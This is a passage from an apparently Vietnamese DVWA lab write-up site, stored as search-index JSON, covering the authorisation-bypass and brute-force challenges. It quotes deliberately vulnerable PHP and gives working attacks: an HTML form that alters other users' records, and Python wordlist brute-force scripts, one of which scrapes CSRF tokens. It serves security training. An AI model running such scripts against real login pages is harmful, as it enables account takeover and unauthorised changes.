d\u00e0ng truy c\u1eadp \u0111\u01b0\u1ee3c tr\u1ef1c ti\u1ebfp trang Authorisation Bypass v\u1edbi user gordonb Authorisation bypass \u0111\u01b0\u1ee3c hi\u1ec3u \u0111\u01a1n gi\u1ea3n l\u00e0 d\u00f9ng m\u1ed9t v\u00e0i \"th\u1ee7 thu\u1eadt\" \u0111\u1ec3 truy c\u1eadp nh\u1eefng t\u00e0i nguy\u00ean m\u00e0 n\u1ed9i t\u1ea1i user \u0111\u00f3 kh\u00f4ng c\u00f3 quy\u1ec1n truy c\u1eadp t\u1edbi. \"Th\u1ee7 thu\u1eadt\" n\u00e0y c\u00f3 \u0111\u01b0\u1ee3c l\u00e0 nh\u1edd v\u00e0o \u0111\u1ed9i tri\u1ec3n khai ch\u01b0a c\u00f3 nh\u1eefng chi\u1ebfc l\u01b0\u1ee3c ph\u00f2ng v\u1ec7 k\u0129 c\u00e0ng.","title":"Analysis"},{"location":"dvwa/authorisation-bypass/#exploition","text":"","title":"Exploition"},{"location":"dvwa/authorisation-bypass/#security-level-medium","text":"Source code vulnerabilities/authbypass/source/medium.php <?php /* Only the admin user is allowed to access this page. Have a look at these two files for possible vulnerabilities: * vulnerabilities/authbypass/get_user_data.php * vulnerabilities/authbypass/change_user_details.php */ if ( dvwaCurrentUser () != \"admin\" ) { print \"Unauthorised\" ; http_response_code ( 403 ); exit ; } ?>","title":"Security Level: Medium"},{"location":"dvwa/authorisation-bypass/#analysis_1","text":"Challenge n\u00e0y cung c\u1ea5p cho ta 2 API, 1 cho GET th\u00f4ng tin c\u00e1c user, 1 cho POST mang m\u1ee5c \u0111\u00edch \u0111\u1ed5i th\u00f4ng tin user: HTTP GET: localhost:4280/vulnerabilities/authbypass/get_user_data.php HTTP POST: http://localhost:4280/vulnerabilities/authbypass/change_user_details.php \u0110i\u1ec1u ng\u1ea1c nhi\u00ean h\u01a1n. M\u1eb7c d\u00f9 v\u1edbi user gordonb , ta kh\u00f4ng truy c\u1eadp \u0111\u01b0\u1ee3c v\u00e0o trang challenge nh\u01b0ng l\u1ea1i c\u00f3 th\u1ec3 truy c\u1eadp \u0111\u01b0\u1ee3c v\u00e0o 2 API [{ \"user_id\" : \"1\" , \"first_name\" : \"admin\" , \"surname\" : \"admin\" },{ \"user_id\" : \"2\" , \"first_name\" : \"Gordon\" , \"surname\" : \"Brown\" },{ \"user_id\" : \"3\" , \"first_name\" : \"Hack\" , \"surname\" : \"Me\" },{ \"user_id\" : \"4\" , \"first_name\" : \"Pablo\" , \"surname\" : \"Picasso\" },{ \"user_id\" : \"5\" , \"first_name\" : \"Bob\" , \"surname\" : \"Smith\" }] \u0110i\u1ec1u n\u00e0y c\u00f3 ngh\u0129a l\u00e0, ta c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng 2 API \u0111\u00f3 v\u00e0 c\u00f3 th\u1ec3 khai th\u00e1c \u0111\u01b0\u1ee3c g\u00ec \u0111\u00f3 t\u1eeb c\u00e1i API d\u00f9ng HTTP POST. Vi\u1ec7c n\u00e0y ch\u1ee9ng t\u1ecf ta \u0111\u00e3 authorisation bypass th\u00e0nh c\u00f4ng.","title":"Analysis"},{"location":"dvwa/authorisation-bypass/#exploition_1","text":"Oke, tri\u1ec3n khai th\u00f4i n\u00e0o. \u0110\u1ea7u ti\u00ean l\u00e0 t\u1ea1o 1 form HTTP POST c\u01a1 b\u1ea3n nh\u1eb1m g\u1eedi request l\u00ean API http://localhost:4280/vulnerabilities/authbypass/change_user_details.php <!DOCTYPE html> < html > < head > < title > POST Data to Web Page </ title > </ head > < body > < h1 > Enter User Information </ h1 > < form action = \"http://localhost:4280/vulnerabilities/authbypass/change_user_details.php\" method = \"post\" > < label for = \"user_id\" > ID: </ label > < input type = \"text\" id = \"user_id\" name = \"user_id\" value = \"2\" >< br >< br > < label for = \"first_name\" > First Name: </ label > < input type = \"text\" id = \"first_name\" name = \"first_name\" value = \"admin\" >< br >< br > < label for = \"surname\" > Surname: </ label > < input type = \"text\" id = \"surname\" name = \"surname\" value = \"admin\" >< br >< br > < input type = \"submit\" value = \"Submit\" > </ form > </ body > </ html > Ta th\u1ea5y r\u1eb1ng user c\u00f3 user_id=1 ch\u00ednh l\u00e0 admin. Ta th\u1eed ch\u1ec9nh s\u1eeda t\u1ea1i n\u01a1i c\u00f3 user_id=2 th\u00e0nh \"first_name\":\"admin\",\"surname\":\"admin\" V\u00e0 \u0111i\u1ec1u ng\u1ea1c nhi\u00ean l\u00e0 ta ho\u00e0n to\u00e0n c\u00f3 th\u1ec3 ch\u1ec9nh s\u1eeda th\u00f4ng tin c\u00e1c user (xem h\u00ecnh d\u01b0\u1edbi), nh\u01b0ng ho\u00e0n to\u00e0n kh\u00f4ng v\u00e0o \u0111\u01b0\u1ee3c trang http://localhost:4280/vulnerabilities/authbypass/ Thay \u0111\u1ed5i th\u00f4ng tin user th\u00f4ng qua user gordonb Ho\u00e0n th\u00e0nh th\u1eed th\u00e1ch.","title":"Exploition"},{"location":"dvwa/authorisation-bypass/#security-level-high","text":"Source code vulnerabilities/authbypass/source/high.php <?php /* Only the admin user is allowed to access this page. Have a look at this file for possible vulnerabilities: * vulnerabilities/authbypass/change_user_details.php */ if ( dvwaCurrentUser () != \"admin\" ) { print \"Unauthorised\" ; http_response_code ( 403 ); exit ; } ?>","title":"Security Level: High"},{"location":"dvwa/authorisation-bypass/#analysis_2","text":"\u1ede c\u1ea5p \u0111\u1ed9 n\u00e0y, h\u1ecd ch\u1eb7n kh\u00f4ng cho ng\u01b0\u1eddi d\u00f9ng b\u00ecnh th\u01b0\u1eddng truy c\u1eadp v\u00e0o API d\u00f9ng HTTP GET nh\u01b0ng l\u1ea1i qu\u00ean ch\u1eb7n c\u00e1i POST, d\u1eabn \u0111\u1ebfn vi\u1ec7c ta v\u1eabn c\u00f3 th\u1ec3 d\u1ec5 d\u00e0ng thay \u0111\u1ed5i th\u00f4ng tin c\u00e1c user t\u1eeb user gordonb","title":"Analysis"},{"location":"dvwa/authorisation-bypass/#security-level-impossible","text":"Source code vulnerabilities/authbypass/source/impossible.php <?php /* Only the admin user is allowed to access this page */ if ( dvwaCurrentUser () != \"admin\" ) { print \"Unauthorised\" ; http_response_code ( 403 ); exit ; } ?>","title":"Security Level: Impossible"},{"location":"dvwa/authorisation-bypass/#analysis_3","text":"Hopefully on this level all the functions correctly check authorisation before allowing access to the data. There may however be some non-authorisation related issues on the page, so do not write it off as fully secure.","title":"Analysis"},{"location":"dvwa/authorisation-bypass/#more-information","text":"Reference: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema Reference: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema Reference: https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication","title":"More Information"},{"location":"dvwa/brute-force/","tags":["DVWA","Brute Force"],"text":"Brute Force \u00b6 A brute force attack can manifest itself in many different ways, but primarily consists in an attacker configuring predetermined values, making requests to a server using those values, and then analyzing the response. For the sake of efficiency, an attacker may use a dictionary attack (with or without mutations) or a traditional brute-force attack (with given classes of characters e.g.: alphanumeric, special, case (in)sensitive). Considering a given method, number of tries, efficiency of the system which conducts the attack, and estimated efficiency of the system which is attacked the attacker is able to calculate approximately how long it will take to submit all chosen predetermined values. Objective \u00b6 Your goal is to get the administrator\u2019s password by brute forcing. Bonus points for getting the other four user passwords! Security Level: Low \u00b6 Source code vulnerabilities/brute/source/low.php <?php if ( isset ( $_GET [ 'Login' ] ) ) { // Get username $user = $_GET [ 'username' ]; // Get password $pass = $_GET [ 'password' ]; $pass = md5 ( $pass ); // Check the database $query = \"SELECT * FROM `users` WHERE user = ' $user ' AND password = ' $pass ';\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $query ) or die ( '<pre>' . (( is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_error ( $GLOBALS [ \"___mysqli_ston\" ]) : (( $___mysqli_res = mysqli_connect_error ()) ? $___mysqli_res : false )) . '</pre>' ); if ( $result && mysqli_num_rows ( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc ( $result ); $avatar = $row [ \"avatar\" ]; // Login successful echo \"<p>Welcome to the password protected area { $user } </p>\" ; echo \"<img src= \\\" { $avatar } \\\" />\" ; } else { // Login failed echo \"<pre><br />Username and/or password incorrect.</pre>\" ; } (( is_null ( $___mysqli_res = mysqli_close ( $GLOBALS [ \"___mysqli_ston\" ]))) ? false : $___mysqli_res ); } ?> Analysis \u00b6 \u1ede challenge n\u00e0y ta th\u1ea5y r\u1eb1ng, h\u1ecd kh\u00f4ng d\u00f9ng c\u00e1c c\u01a1 ch\u1ebf b\u1ea3o m\u1eadt. Do \u0111\u00f3 ta ho\u00e0n to\u00e0n c\u00f3 th\u1ec3 d\u00f9ng tool nh\u01b0 BurpSuite, hydra,... \u0111\u1ec3 Brute Force password c\u1ee7a c\u00e1c user. B\u00ean c\u1ea1nh vi\u1ec7c t\u00ecm ra \u0111\u01b0\u1ee3c password c\u1ee7a user admin , ta c\u1ea7n t\u00ecm username c\u1ee7a 3 user c\u00f2n l\u1ea1i: T\u00ecm th\u00f4ng qua vi\u1ec7c Bruteforce username T\u00ecm th\u00f4ng qua vi\u1ec7c t\u1ea5n c\u00f4ng SQLi Quan tr\u1ecdng n\u1eefa. V\u1edbi challenge n\u00e0y ta th\u1ea5y r\u1eb1ng vi\u1ec7c login sai username ho\u1eb7c password s\u1ebd xu\u1ea5t hi\u1ec7n th\u00f4ng tin Username and/or password incorrect. . Do \u0111\u00f3 ta kh\u00f4ng th\u1ec3 d\u00f9ng m\u1ed9t v\u00e0i th\u1ee7 thu\u1eadt nh\u1ecf \u0111\u1ec3 t\u00ecm \u0111\u01b0\u1ee3c username m\u1ed9t c\u00e1ch nhanh ch\u1ed1ng \u0111\u01b0\u1ee3c. Ta c\u1ea7n Brute Force \u0111\u00fang c\u1ea3 v\u1ec1 username l\u1eabn password. Ti\u1ebfp theo, v\u00ec \u0111\u00e2y l\u00e0 challenge cho vi\u1ec7c ki\u1ec3m th\u1eed, n\u00ean ch\u1eafc ch\u1eafn r\u1eb1ng username v\u00e0 password s\u1ebd \u0111\u01a1n gi\u1ea3n v\u00e0 s\u1ebd t\u1ed3n t\u1ea1i trong wordlist. Exploition \u00b6 \u1ede challenge n\u00e0y t\u00f4i s\u1ebd g\u1ee3i \u00fd cho c\u00e1c b\u1ea1n s\u1eed d\u1ee5ng python \u0111\u1ec3 Brute Force password. V\u1edbi m\u1ee5c ti\u00eau l\u00e0 t\u00ecm password c\u1ee7a t\u00e0i kho\u1ea3n admin. V\u1edbi c\u00e1c user kh\u00e1c, ta s\u1ebd d\u00f9ng 2 v\u00f2ng for \u0111\u1ec3 Brute Force Source code brute force import requests url = 'http://localhost:4280/vulnerabilities/brute/' params_base = { 'username' : 'admin' , 'Login' : 'Login' } # Qu\u0103ng \u0111\u00f3ng header b\u00ean burp suite v\u00f4 \u0111\u00eai headers = { 'sec-ch-ua' : '' , 'sec-ch-ua-mobile' : '?0' , 'sec-ch-ua-platform' : '' , 'Upgrade-Insecure-Requests' : '1' , 'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36' , 'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' , 'Sec-Fetch-Site' : 'same-origin' , 'Sec-Fetch-Mode' : 'navigate' , 'Sec-Fetch-User' : '?1' , 'Sec-Fetch-Dest' : 'document' , 'Referer' : 'http://localhost:4280/vulnerabilities/brute/' , 'Accept-Encoding' : 'gzip, deflate' , 'Accept-Language' : 'en-US,en;q=0.9' , 'Cookie' : 'PHPSESSID=cc82ec3baf0f4a4eb0e7513fd7bc084a; security=low' } # \u0110\u1ecdc danh s\u00e1ch m\u1eadt kh\u1ea9u t\u1eeb wordlist with open ( 'file_name/path_file' , 'r' ) as password_file : for line in password_file : # Lo\u1ea1i b\u1ecf k\u00fd t\u1ef1 xu\u1ed1ng d\u00f2ng t\u1eeb m\u1eadt kh\u1ea9u password = line . strip () # Th\u00eam m\u1eadt kh\u1ea9u v\u00e0o params_base params = params_base . copy () params [ 'password' ] = password # G\u1eedi y\u00eau c\u1ea7u GET v\u1edbi m\u1eadt kh\u1ea9u kh\u00e1c nhau response = requests . get ( url , params = params , headers = headers ) # Ki\u1ec3m tra v\u00e0 x\u1eed l\u00fd ph\u1ea3n h\u1ed3i - d\u00f2ng `Username and/or password incorrect.` trong Sourcecode if \"Username and/or password incorrect.\" not in response . text : print ( f \"\u0110\u00e3 t\u00ecm th\u1ea5y m\u1eadt kh\u1ea9u \u0111\u00fang: { password } \" ) break V\u00e0 k\u1ebft qu\u1ea3 nh\u01b0 h\u00ecnh d\u01b0\u1edbi Security Level: Medium \u00b6 Source code vulnerabilities/brute/source/medium.php <?php if ( isset ( $_GET [ 'Login' ] ) ) { // Sanitise username input $user = $_GET [ 'username' ]; $user = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $user ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); // Sanitise password input $pass = $_GET [ 'password' ]; $pass = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $pass ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); $pass = md5 ( $pass ); // Check the database $query = \"SELECT * FROM `users` WHERE user = ' $user ' AND password = ' $pass ';\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $query ) or die ( '<pre>' . (( is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_error ( $GLOBALS [ \"___mysqli_ston\" ]) : (( $___mysqli_res = mysqli_connect_error ()) ? $___mysqli_res : false )) . '</pre>' ); if ( $result && mysqli_num_rows ( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc ( $result ); $avatar = $row [ \"avatar\" ]; // Login successful echo \"<p>Welcome to the password protected area { $user } </p>\" ; echo \"<img src= \\\" { $avatar } \\\" />\" ; } else { // Login failed sleep ( 2 ); echo \"<pre><br />Username and/or password incorrect.</pre>\" ; } (( is_null ( $___mysqli_res = mysqli_close ( $GLOBALS [ \"___mysqli_ston\" ]))) ? false : $___mysqli_res ); } ?> Analysis \u00b6 \u1ede ph\u1ea7n c\u1ea5p \u0111\u1ed9 n\u00e0y, b\u1ea1n c\u0169ng d\u1ec5 d\u00e0ng c\u00f3 th\u1ec3 th\u1ef1c hi\u1ec7n Brute Force nh\u01b0 \u1edf c\u1ea5p \u0111\u1ed9 Low. Nh\u01b0ng ph\u1ea3i ch\u1edd 2 gi\u00e2y sau khi login fail (d\u00f2ng sleep(2) trong m\u00e3 ngu\u1ed3n). Exploition \u00b6 Ta s\u1ebd d\u00f9ng ch\u00ednh source code \u1edf c\u1ea5p \u0111\u1ed9 Low \u0111\u1ec3 bypass c\u1ea5p \u0111\u1ed9 n\u00e0y. Security Level: High \u00b6 Source code vulnerabilities/brute/source/high.php <?php if ( isset ( $_GET [ 'Login' ] ) ) { // Check Anti-CSRF token checkToken ( $_REQUEST [ 'user_token' ], $_SESSION [ 'session_token' ], 'index.php' ); // Sanitise username input $user = $_GET [ 'username' ]; $user = stripslashes ( $user ); $user = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $user ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); // Sanitise password input $pass = $_GET [ 'password' ]; $pass = stripslashes ( $pass ); $pass = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $pass ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); $pass = md5 ( $pass ); // Check database $query = \"SELECT * FROM `users` WHERE user = ' $user ' AND password = ' $pass ';\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $query ) or die ( '<pre>' . (( is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_error ( $GLOBALS [ \"___mysqli_ston\" ]) : (( $___mysqli_res = mysqli_connect_error ()) ? $___mysqli_res : false )) . '</pre>' ); if ( $result && mysqli_num_rows ( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc ( $result ); $avatar = $row [ \"avatar\" ]; // Login successful echo \"<p>Welcome to the password protected area { $user } </p>\" ; echo \"<img src= \\\" { $avatar } \\\" />\" ; } else { // Login failed sleep ( rand ( 0 , 3 ) ); echo \"<pre><br />Username and/or password incorrect.</pre>\" ; } (( is_null ( $___mysqli_res = mysqli_close ( $GLOBALS [ \"___mysqli_ston\" ]))) ? false : $___mysqli_res ); } // Generate Anti-CSRF token generateSessionToken (); ?> Analysis \u00b6 \u1ede c\u1ea5p \u0111\u1ed9 n\u00e0y, h\u1ecd n\u00e2ng t\u1ea7m h\u01a1n b\u1eb1ng vi\u1ec7c th\u00eam CSRF token d\u01b0\u1edbi t\u00ean user_token. T\u1ee9c n\u1ebfu request m\u00e0 sai th\u00ec ngay l\u1eadp t\u1ee9c trang web s\u1ebd t\u1ea1o m\u1ed9t user_token m\u1edbi. user_token V\u00ec user_token n\u00f3 g\u1eafn \u1edf trang web v\u00e0 ch\u1ec9 hidden th\u00f4i, n\u00ean ta c\u00f3 th\u1ec3 khai th\u00e1c \u1edf \u0111i\u1ec3m n\u00e0y. \u0110i\u1ec1u ch\u00fang ta c\u1ea7n hi\u1ec7n gi\u1edd l\u00e0 b\u1eaft \u0111\u01b0\u1ee3c user_token c\u1ee7a trang web tr\u01b0\u1edbc khi th\u1ef1c thi c\u00f4ng \u0111o\u1ea1n login. T\u1ee9c l\u00e0 ph\u1ea3i duy\u1ec7t web l\u1ea5y user_token tr\u01b0\u1edbc, sau \u0111\u00f3 g\u1eafn n\u00f3 v\u00e0o g\u00f3i request g\u1eedi login. Kh\u00fac n\u00e0y, ta h\u1ecfi ChatGPT th\u00f4i :3 Exploition \u00b6 Ro\u00e0i, tri\u1ec3n khai th\u00f4i. find.py import requests import re # URL c\u1ee7a trang web b\u1ea1n mu\u1ed1n truy c\u1eadp url = 'http://localhost:4280/vulnerabilities/brute/' # T\u1ea1o y\u00eau c\u1ea7u GET \u0111\u1ec3 t\u1ea3i trang web response = requests . get ( url ) # Ki\u1ec3m tra xem y\u00eau c\u1ea7u c\u00f3 th\u00e0nh c\u00f4ng kh\u00f4ng if response . status_code == 200 : # S\u1eed d\u1ee5ng bi\u1ec3u th\u1ee9c ch\u00ednh quy \u0111\u1ec3 t\u00ecm gi\u00e1 tr\u1ecb c\u1ee7a th\u1ebb c\u00f3 name=\"user_token\" pattern = r '<input.*?type=[\" \\' ]hidden[\" \\' ].*?name=[\" \\' ]user_token[\" \\' ].*?value=[\" \\' ](.*?)[\" \\' ].*?>' match = re . search ( pattern , response . text ) # Ki\u1ec3m tra xem c\u00f3 t\u00ecm th\u1ea5y gi\u00e1 tr\u1ecb hay kh\u00f4ng if match : user_token_value = match . group ( 1 ) print ( f 'Gi\u00e1 tr\u1ecb c\u1ee7a th\u1ebb c\u00f3 name=\"user_token_value\" l\u00e0: { user_token_value } ' ) else : print ( 'Kh\u00f4ng t\u00ecm th\u1ea5y th\u1ebb c\u00f3 name=\"user_token_value\" tr\u00ean trang web.' ) else : print ( 'Kh\u00f4ng th\u1ec3 truy c\u1eadp trang web.' ) K\u1ebft h\u1ee3p \u0111o\u1ea1n code tr\u00ean v\u00e0 \u0111o\u1ea1n code \u1edf challenge Low. Ta \u0111\u01b0\u1ee3c code ho\u00e0n ch\u1ec9nh (l\u01b0u \u00fd \u1edf challenge n\u00e0y c\u00f3 th\u1eddi gian login fail \u0111\u01b0\u1ee3c random t\u1eeb 0 t\u1edbi 3s). high.py import requests import re url = 'http://localhost:4280/vulnerabilities/brute/' params_base = { 'username' : 'admin' , 'Login' : 'Login' , 'user_token' : csrf_token } headers = { 'sec-ch-ua' : '' , 'sec-ch-ua-mobile' : '?0' , 'sec-ch-ua-platform' : '' , 'Upgrade-Insecure-Requests' : '1' , 'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36' , 'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' , 'Sec-Fetch-Site' : 'same-origin' , 'Sec-Fetch-Mode' : 'navigate' , 'Sec-Fetch-User' : '?1' , 'Sec-Fetch-Dest' : 'document' , 'Referer' : 'http://localhost:4280/vulnerabilities/brute/' , 'Accept-Encoding' : 'gzip, deflate' , 'Accept-Language' : 'en-US,en;q=0.9' , 'Cookie' : 'PHPSESSID=cc82ec3baf0f4a4eb0e7513fd7bc084a; security=low' } # \u0110\u1ecdc danh s\u00e1ch m\u1eadt kh\u1ea9u t\u1eeb t\u1ec7p pass.txt with open ( 'rockyou.txt' , 'r' ) as password_file : for line in password_file : # Lo\u1ea1i b\u1ecf k\u00fd t\u1ef1 xu\u1ed1ng d\u00f2ng t\u1eeb m\u1eadt kh\u1ea9u password = line . strip () # Th\u00eam m\u1eadt kh\u1ea9u v\u00e0o params_base params = params_base . copy () params [ 'password' ] = password # G\u1eedi y\u00eau c\u1ea7u GET v\u1edbi m\u1eadt kh\u1ea9u kh\u00e1c nhau response = requests . get ( url , params = params , headers = headers ) if response . status_code != 200 : pattern = r '<input.*?type=[\" \\' ]hidden[\" \\' ].*?name=[\" \\' ]user_token[\" \\' ].*?value=[\" \\' ](.*?)[\" \\' ].*?>' match = re . search ( pattern , response . text ) user_token = match . group ( 1 ) params [ 'user_token' ] = user_token # Ki\u1ec3m tra v\u00e0 x\u1eed l\u00fd ph\u1ea3n h\u1ed3i \u1edf \u0111\u00e2y # V\u00ed d\u1ee5: n\u1ebfu c\u00f3 d\u1ea5u hi\u1ec7u m\u1eadt kh\u1ea9u \u0111\u00fang, b\u1ea1n c\u00f3 th\u1ec3 in ra v\u00e0 d\u1eebng v\u00f2ng l\u1eb7p if \"Username and/or password incorrect.\" not in response . text : print ( f \"\u0110\u00e3 t\u00ecm th\u1ea5y m\u1eadt kh\u1ea9u \u0111\u00fang: { password } \" ) break B\u00ean c\u1ea1nh vi\u1ec7c d\u00f9ng th\u01b0 vi\u1ec7n re \u0111\u1ec3 t\u00ecm ph\u1ea7n t\u1eed trong website, ta c\u00f3 th\u1ec3 d\u00f9ng BeautifulSoup thay th\u1ebf. V\u1ec1 c\u01a1 b\u1ea3n, b\u01b0\u1edbc \u0111\u1ea7u c\u1ee7a vi\u1ec7c test pass l\u00e0 \u0111\u1eb7t 1 csrf_token gi\u1ea3 \u0111\u1ec3 g\u1eedi request t\u1edbi website. Sau \u0111\u00f3 ch\u1eafc ch\u1eafn r\u1eb1ng csrf_token l\u00fac n\u00e0y s\u1ebd b\u1ecb thay \u0111\u1ed5i sau l\u1ea7n request \u0111\u1ea7u ti\u00ean. L\u00fac n\u00e0y ta s\u1ebd d\u00f2 website \u0111\u1ec3 l\u1ea5y csrf_token v\u00e0 \u0111\u01b0a n\u00f3 v\u00e0o bi\u1ebfn user_token. T\u1eeb request th\u1ee9 2 tr\u1edf \u0111i, m\u1ecdi chuy\u1ec7n s\u1ebd \u0111\u01a1n gi\u1ea3n h\u01a1n nhi\u1ec1u. Security Level: Impossible \u00b6 Source code vulnerabilities/brute/source/impossible.php <?php if ( isset ( $_POST [ 'Login' ] ) && isset ( $_POST [ 'username' ]) && isset ( $_POST [ 'password' ]) ) { // Check Anti-CSRF token checkToken ( $_REQUEST [ 'user_token' ], $_SESSION [ 'session_token' ], 'index.php' ); // Sanitise username input $user = $_POST [ 'username' ]; $user = stripslashes ( $user ); $user = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $user ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); // Sanitise password input $pass = $_POST [ 'password' ]; $pass = stripslashes ( $pass ); $pass = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $pass ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); $pass = md5 ( $pass ); // Default values $total_failed_login = 3 ; $lockout_time = 15 ; $account_locked = false ; // Check the database (Check user information) $data = $db -> prepare ( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' ); $data -> bindParam ( ':user' , $user , PDO :: PARAM_STR ); $data -> execute (); $row = $data -> fetch (); // Check to see if the user has been locked out. if ( ( $data -> rowCount () == 1 ) && ( $row [ 'failed_login' ] >= $total_failed_login ) ) { // User locked out. Note, using this method would allow for user enumeration! //echo \"<pre><br />This account has been locked due to too many incorrect logins.</pre>\"; // Calculate when the user would be allowed to login again $last_login = strtotime ( $row [ 'last_login' ] ); $timeout = $last_login + ( $lockout_time * 60 ); $timenow = time (); /* print \"The last login was: \" . date (\"h:i:s\", $last_login) . \"<br />\"; print \"The timenow is: \" . date (\"h:i:s\", $timenow) . \"<br />\"; print \"The timeout is: \" . date (\"h:i:s\", $timeout) . \"<br />\"; */ // Check to see if enough time has passed, if it hasn't locked the account if ( $timenow < $timeout ) { $account_locked = true ; // print \"The account is locked<br />\"; } } // Check the database (if username matches the password) $data = $db -> prepare ( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' ); $data -> bindParam ( ':user' , $user , PDO :: PARAM_STR ); $data -> bindParam ( ':password' , $pass , PDO :: PARAM_STR ); $data -> execute (); $row = $data -> fetch (); // If its a valid login... if ( ( $data -> rowCount () == 1 ) && ( $account_locked == false ) ) { // Get users details $avatar = $row [ 'avatar' ]; $failed_login = $row [ 'failed_login' ]; $last_login = $row [ 'last_login' ]; // Login successful echo \"<p>Welcome to the password protected area <em> { $user } </em></p>\" ; echo \"<img src= \\\" { $avatar } \\\" />\" ; // Had the account been locked out since last login? if ( $failed_login >= $total_failed_login ) { echo \"<p><em>Warning</em>: Someone might of been brute forcing your account.</p>\" ; echo \"<p>Number of login attempts: <em> { $failed_login } </em>.<br />Last login attempt was at: <em> { $last_login } </em>.</p>\" ; } // Reset bad login count $data = $db -> prepare ( 'UPDATE users SET failed_login = \"0\" WHERE user = (:user) LIMIT 1;' ); $data -> bindParam ( ':user' , $user , PDO :: PARAM_STR ); $data -> execute (); } else { // Login failed sleep ( rand ( 2 , 4 ) ); // Give the user some feedback echo \"<pre><br />Username and/or password incorrect.<br /><br/>Alternative, the account has been locked because of too many failed logins.<br />If this is the case, <em>please try again in { $lockout_time } minutes</em>.</pre>\" ; // Update bad login count $data = $db -> prepare ( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' ); $data -> bindParam ( ':user' , $user , PDO :: PARAM_STR ); $data -> execute (); } // Set the last login time $data = $db -> prepare ( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' ); $data -> bindParam ( ':user' , $user , PDO :: PARAM_STR ); $data -> execute (); } // Generate Anti-CSRF token generateSessionToken (); ?> Analysis \u00b6 Brute force (and user enumeration) should not be possible in the impossible level. The developer has added a \"lock out\" feature, where if there are five bad logins within the last 15 minutes, the locked out user cannot log in. If the locked out user tries to login, even with a valid password, it will say their username or password is incorrect. This will make it impossible to know if there is a valid account on the system, with that password, and if the account is locked. This can cause a \"Denial of Service\" (DoS), by having someone continually trying to login to someone's account. This level would need to be extended by blacklisting the attacker (e.g. IP address, country, user-agent). What we learned \u00b6 CSRF token Write script More Information \u00b6 https://owasp.org/www-community/attacks/Brute_force_attack http://www.symantec.com/connect/articles/password-crackers-ensuring-security-your-password https://www.golinuxcloud.com/brute-force-attack-web-forms","title":"Brute Force"},{"location":"dvwa/brute-force/#brute-force","text":"A brute force attack can manifest itself in many different ways, but primarily consists in an attacker configuring predetermined values, making requests to a server using those values, and then analyzing the response. For the sake of efficiency, an attacker may use a dictionary attack (with or without mutations) or a traditional brute-force attack (with given classes of characters e.g.: alphanumeric, special, case (in)sensitive). Considering a given method, number of tries, efficiency of the system which conducts the attack, and estimated efficiency of the system which is attacked the attacker is able to calculate approximately how long it will take to submit all chosen predetermined values.","title":"Brute Force"},{"location":"dvwa/brute-force/#objective","text":"Your goal is to get the administrator\u2019s password by brute forcing. Bonus points for getting the other four user passwords!","title":"Objective"},{"location":"dvwa/brute-force/#security-level-low","text":"Source code vulnerabilities/brute/source/low.php <?php if ( isset ( $_GET [ 'Login' 